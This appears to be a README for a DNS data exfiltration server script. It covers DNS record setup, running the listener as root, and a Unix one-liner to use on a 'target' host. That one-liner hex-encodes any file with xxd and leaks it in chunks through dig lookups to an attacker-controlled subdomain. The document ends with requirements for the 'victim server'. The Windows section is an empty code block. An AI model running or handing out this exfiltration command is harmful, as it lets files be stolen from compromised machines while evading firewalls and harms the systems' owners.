# Requirements [!!!]
- You should create an DNS entry that points to the ip address that you will run the script. And an NameServer wuth the hostname as the subdomain.
```code
audit.yourdomain.com A 1.2.3.4
audit.yourdomain.com NS ns1.yourdomain.com
```
- After doing this, your should run the script as below:
```bash
$ python3 exfil_server-dns.py --dns-host audit.yourdomain.com
```

# Instructions
- Be sure that you are running the server using bash screen or tmux, to hold it opened<br>
- Run the command using Python3 and root<br>
```bash
$ python3 exfil_server-dns.py --dns-host test.yourdomain.com
```
- Now on the target, there are some ways to exfiltrate, based on operation system:<br>

# Dumping files
## Unix
- Single File
```bash
$ xxd -p -c 62 <FILENAME> | sed -E 's/^(.{63})/\1./' | while read c; do dig +short +retry=0 +time=1 "$(echo "$c").abc.audit.yourdomain.com" > /dev/null; done
```

## Windows
- Single File
```powershell
```

# Requirements
Since we are talking of an DNS Exfiltration, we should meet some requirements for the victim server:

- FW doing external DNS queries
- Powershell acessible